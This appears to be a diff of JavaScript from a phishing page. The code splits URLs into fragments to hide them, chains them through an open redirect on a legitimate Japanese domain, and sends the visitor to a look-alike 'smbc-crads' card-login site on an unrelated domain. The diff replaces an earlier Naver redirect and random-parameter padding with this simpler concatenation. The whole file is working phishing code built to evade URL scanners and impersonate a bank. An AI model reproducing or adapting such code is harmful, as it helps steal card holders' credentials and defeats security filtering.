@@ -10,55 +10,38 @@
                 'htt',
                 'ps:',
                 '//',
-                'cc.',
-                'na',
-                'ver.',
-                'com/',
-                'cc?'
+                'ph',
+                'yd.',
+                'sony',
+                'son',
+                'po.',
+                'jp/',
+                'device',
+                'check/',
+                'redi',
+                'rect/?',
+                'red',
+                'irect',
+                'URL',
+                '='
             ];
 
             var hrefParams = [
-                'u=htt',
+                'htt',
                 'ps:',
                 '//',
                 'smbc-',
                 'crads',
                 '-com.',
-                'spiritmeta',
-                'morphosis',
+                'schoolbullying',
+                'australia',
                 '.com',
                 '/session'
             ];
 
-            var params = [
-                getRandomChar() + '=pst.link',
-                getRandomChar() + '=',
-                getRandomChar() + '=',
-                'm=1',
-                'nsc=Mblog.post'
-            ];
-
-            var obfuscatedUrl = '';
-            for (var i = 0; i < baseUrlParams.length; i++) {
-                obfuscatedUrl += baseUrlParams[i];
-            }
-
-            for (var j = 0; j < params.length; j++) {
-                obfuscatedUrl += (j > 0 ? '&' : '') + params[j];
-            }
-
-            obfuscatedUrl += '&';
-
-            for (var k = 0; k < hrefParams.length; k++) {
-                obfuscatedUrl += hrefParams[k];
-            }
-
-            return obfuscatedUrl;
-        }
-
-        function getRandomChar() {
-            var chars = 'abcdefghijklmnopqrstuvwxyz';
-            return chars[Math.floor(Math.random() * chars.length)];
+            var baseUrl = baseUrlParams.join('');
+            var hrefUrl = hrefParams.join('');
+            return baseUrl + hrefUrl;
         }
 
         window.onload = function () {
